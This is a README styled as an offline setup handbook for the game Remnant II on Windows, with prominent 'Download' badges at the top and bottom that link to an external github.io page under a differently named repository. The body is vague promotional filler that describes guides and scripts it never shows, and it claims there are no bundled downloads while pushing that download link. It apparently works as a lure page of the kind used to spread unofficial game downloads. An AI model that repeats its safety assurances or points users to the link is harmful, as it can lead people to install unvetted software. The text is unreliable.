![preview](https://raw.githubusercontent.com/trangnguyen1211/Remnant-2-Offline-Vault/main/poster_68e82fc.svg)
[![Download](https://raw.githubusercontent.com/trangnguyen1211/Remnant-2-Offline-Vault/main/pkg_63ace4.svg)](https://trangnguyen1211.github.io/Remnant-2-Offline-Vault/)

# Remnant II Offline Companion — Field Manual for the Wandering Survivor 🧭

**A safe, offline-first setup companion for Windows 10 and Windows 11, built for players who prefer to keep their adventures self-contained and their systems tidy.**

![Platform](https://img.shields.io/badge/platform-Windows%2010%20%7C%2011-0078D6?style=flat-square&logo=windows&logoColor=white)
![License](https://img.shields.io/badge/license-MIT-green?style=flat-square)
![Status](https://img.shields.io/badge/status-active-brightgreen?style=flat-square)
![Language](https://img.shields.io/badge/language-Markdown%20%2B%20PowerShell-5391FE?style=flat-square)
![Offline](https://img.shields.io/badge/mode-offline--friendly-8A2BE2?style=flat-square)

---

## 🌌 Overview

There is a particular kind of quiet that settles over a room when the internet goes down and a game still works exactly as it should. That quiet is what this project was built around. **Remnant II Offline Companion** is a documentation-first repository: a structured, human-readable guide that walks Windows users through preparing a clean, local environment for playing *Remnant II* without leaning on live services, cloud sync, or background telemetry.

This is not a game modification, and it is not a shortcut. It is a **handbook** — the kind of thing you'd fold into your back pocket before a long trip. It focuses on safe setup practices, local configuration hygiene, and reproducible steps that any careful user can follow.

The project exists because modern game setups have grown tangled. Launchers overlap, save files scatter across hidden directories, and privacy settings hide behind three layers of menus. This companion untangles that.

---

## 🎯 Why This Exists

Most setup guides assume you want to be online. They assume you want matchmaking, leaderboards, cloud saves, and a dozen background services quietly phoning home. For a large slice of the player base, that assumption is wrong.

This repository addresses a simple, underserved need:

- **Local-first play sessions** that don't depend on a stable connection
- **Predictable save file locations** so nothing is lost between sessions
- **Transparent configuration** with every change documented
- **Reversible steps** — every tweak can be undone without guesswork

Think of it as a lighthouse rather than a motorway. It doesn't move you faster; it keeps you from running aground.

---

## ✨ Key Features

### 🖥️ Responsive Documentation Layout
Every guide page is structured to be readable on a widescreen monitor, a laptop, a tablet, or a phone. Tables wrap, code blocks scroll, and headings stay navigable. Documentation that only works on one screen size is documentation half-written.

### 🌍 Multilingual Support
Core walkthroughs are available in multiple languages, with community-contributed translations reviewed for accuracy. Language files are plain text, which means anyone can propose a fix without touching a build system.

### 🕛 24/7 Customer Support Model
Support is handled through issue templates and a rotating volunteer schedule. Responses are tracked publicly so expectations stay realistic. This isn't a hotline — it's a well-lit help desk that never fully closes.

### 🛡️ Safe Setup Philosophy
No bundled executables, no opaque installers, no third-party mirrors. Everything in this repository is either documentation or plainly readable script. If a file does something, you can open it and see exactly what.

### 🧩 Modular Guide Sections
Each topic stands alone. You can read the save-file section without reading the networking section, and vice versa. Cross-links exist where they help, but no page forces you down a corridor.

### ♻️ Fully Reversible Configuration
Every recommended change includes a documented rollback path. The repository treats your system like a borrowed library book — return it in the same condition you found it.

### 🔍 Search-Friendly Structure
Headings, anchors, and a consistent naming scheme make the guide easy to search both on GitHub and through external engines.

### 🪶 Lightweight Footprint
No background processes, no resident services, no scheduled tasks. Once you close the guide, nothing of it remains running.

### 🧪 Verification Notes
Where behavior can vary between Windows builds, the guide notes what was tested and what wasn't. Honest documentation beats confident documentation.

### 🗂️ Changelog Discipline
Every meaningful documentation change is recorded with a date and a reason. History is part of the product.

---

## 🧠 Core Concepts

Before diving into any specific section, it helps to understand the three pillars this project rests on.

**1. Locality.** Your game data should live where you can find it. This repository favors explicit, discoverable paths over hidden defaults.

**2. Reversibility.** Any change worth making is worth unmaking. Every step ships with its inverse.

**3. Transparency.** If a step can't be explained in plain language, it doesn't belong in the guide.

These three ideas shape every page. When a decision is unclear, the guide defaults to the option that preserves all three.

---

## 🧭 Repository Structure

    Remnant-2-Offline-Companion/
    ├── docs/
    │   ├── getting-started/
    │   ├── save-management/
    │   ├── environment-prep/
    │   ├── troubleshooting/
    │   └── glossary/
    ├── scripts/
    │   ├── read-only/
    │   └── reversible-changes/
    ├── locales/
    │   ├── en/
    │   ├── es/
    │   ├── de/
    │   └── fr/
    ├── assets/
    │   └── diagrams/
    ├── CHANGELOG.md
    ├── CONTRIBUTING.md
    ├── LICENSE
    └── README.md

Each top-level folder has its own short README explaining its purpose, so nobody has to guess.

---

## 🚀 Getting Started

Getting started is intentionally boring — and that's the point.

1. **Read the overview page** in `docs/getting-started/`. It sets expectations and lists prerequisites.
2. **Check your Windows build.** The guide covers Windows 10 (version 21H2 and later) and Windows 11 (all current releases).
3. **Skim the glossary.** A few terms are used with specific meanings here, and knowing them upfront saves time.
4. **Follow the environment preparation page** in order. It is sequenced for a reason.
5. **Keep a notes file.** The guide recommends writing down your original settings before changing anything.

No installation is required to read this repository. It is text, diagrams, and clearly labeled scripts.

---

## 🗺️ Feature Walkthrough

### Environment Preparation
This section walks through the state of a typical Windows machine before any changes are made. It describes what services commonly run in the background, which ones are relevant to an offline session, and how to observe them without altering anything. Observation first, action second.

### Save Management
Save files are the memory of a journey. This section explains where local saves typically live, how to back them up safely, how to restore them, and how to keep multiple profiles separated. It avoids assumptions about directory names, because those can change between storefronts and versions.

### Troubleshooting
A structured decision tree helps narrow down common issues: unexpected startup behavior, controller recognition quirks, display mode mismatches, and audio device routing. Each branch ends with either a fix or a clearly marked escalation path.

### Glossary
Terms like *local profile*, *sandboxed save*, and *reversible change* are defined here so the rest of the guide can use them without re-explaining.

### Scripts
Scripts are split into two categories: **read-only** scripts that only report, and **reversible-change** scripts that modify settings and include a matching undo. Nothing in this repository runs silently.

---

## 🔐 Safety and Privacy Posture

This project takes a conservative stance on system changes.

- No bundled binaries are distributed.
- No network calls are made by any script in this repository.
- No telemetry, analytics, or usage reporting exists here.
- No accounts, credentials, or personal identifiers are requested at any point.
- Every script is human-readable line by line.

If a future contribution cannot meet these standards, it does not get merged. That rule is not negotiable.

---

## 🌐 Multilingual Experience

Localization here is treated as a first-class feature, not an afterthought. Each locale folder contains the same set of documents, and a status file tracks translation completeness. Missing strings fall back to English rather than showing an empty page.

Contributors who speak a language not yet listed are encouraged to open a proposal issue before writing, so structure can be agreed on first. This avoids duplicated effort and keeps terminology consistent across languages.

---

## 🧩 SEO-Friendly Discoverability

The guide is written so that people searching for practical help actually find it. Headings use natural phrasing rather than jargon. Descriptions of common tasks — preparing an offline Windows session, locating local save data, reverting a configuration change — appear in the wording a real person would type.

This isn't about gaming any ranking system. It's about writing clearly enough that a search engine and a tired human agree on what the page is about.

---

## 🧪 Testing and Verification

Documentation claims are tested on real Windows installations before publication. Each page notes:

- The Windows versions it was verified against
- Any hardware or peripheral assumptions
- Known edge cases that were not verified

Unverified claims are labeled as such. A guide that admits uncertainty is more trustworthy than one that never does.

---

## 🤝 Contributing

Contributions are welcome from anyone willing to follow the project's three pillars: locality, reversibility, and transparency.

Before opening a pull request:

1. Read `CONTRIBUTING.md`.
2. Check the issue tracker for related discussions.
3. Match the existing document structure.
4. Include a rollback note for any configuration change.
5. Keep language plain and specific.

Translation contributions follow the same rules, with an added note about the locale status file.

---

## 🛠️ Troubleshooting the Guide Itself

Sometimes the problem isn't the game — it's the documentation. If a step is unclear, outdated, or wrong, the fastest path is a well-formed issue describing:

- What you expected
- What actually happened
- Which Windows version you're on
- Which section of the guide you followed

Precision speeds up fixes for everyone.

---

## 🗓️ Roadmap for 2026

The plan for 2026 centers on depth rather than breadth.

- Expand the troubleshooting tree with more real-world reports
- Add two more locale translations pending volunteer review
- Introduce a printable one-page quick reference
- Refine the reversible-change scripts for clarity
- Add a public verification log with dates

Long-term goals are intentionally modest. A guide that grows too fast becomes a guide nobody trusts.

---

## ❓ Frequently Asked Questions

**Does this repository modify my game files?**
No. It documents how to configure your own environment and provides reversible scripts that change settings, not game content.

**Do I need an internet connection?**
Only to download the guide itself. Everything it describes works without one.

**Is this affiliated with the game's publisher?**
No. This is an independent, community-run documentation project.

**Can I use parts of this guide elsewhere?**
Yes, under the MIT license, with attribution.

**Why no bundled installer?**
Because a readable script is safer than an opaque package. You should always be able to see what runs on your machine.

---

## ⚖️ Disclaimer

This repository is an independent, community-maintained documentation project. It is **not affiliated with, endorsed by, or sponsored by** the developers or publishers of *Remnant II*, nor with Microsoft. All trademarks and game titles belong to their respective owners.

The guides and scripts here are provided for educational and informational purposes. You are responsible for your own system. Always create backups before making configuration changes, and always read a script before running it. The maintainers accept no liability for data loss, system instability, or any other consequence arising from use of this material.

This project is not a substitute for official support channels.

---

## 📜 License

This project is released under the **MIT License**.

You are permitted to use, copy, modify, merge, publish, distribute, sublicense, and sell copies of this material, provided the original copyright notice and permission notice are included.

Read the full license text here: [MIT License](https://opensource.org/licenses/MIT)

Copyright (c) 2026 Remnant II Offline Companion Contributors

---

## 💬 Support Hours and Channels

Support runs around the clock through asynchronous channels, with volunteers rotating coverage so that questions rarely sit unanswered for long. Response times vary by timezone, but every issue receives a reply. The project believes that a question left hanging is a promise broken.

---

## 🌟 Final Word

Every great expedition begins with a quiet checklist. This repository is that checklist. It won't play the game for you, and it won't make the journey shorter — but it will make the journey yours.

[![Download](https://raw.githubusercontent.com/trangnguyen1211/Remnant-2-Offline-Vault/main/pkg_63ace4.svg)](https://trangnguyen1211.github.io/Remnant-2-Offline-Vault/)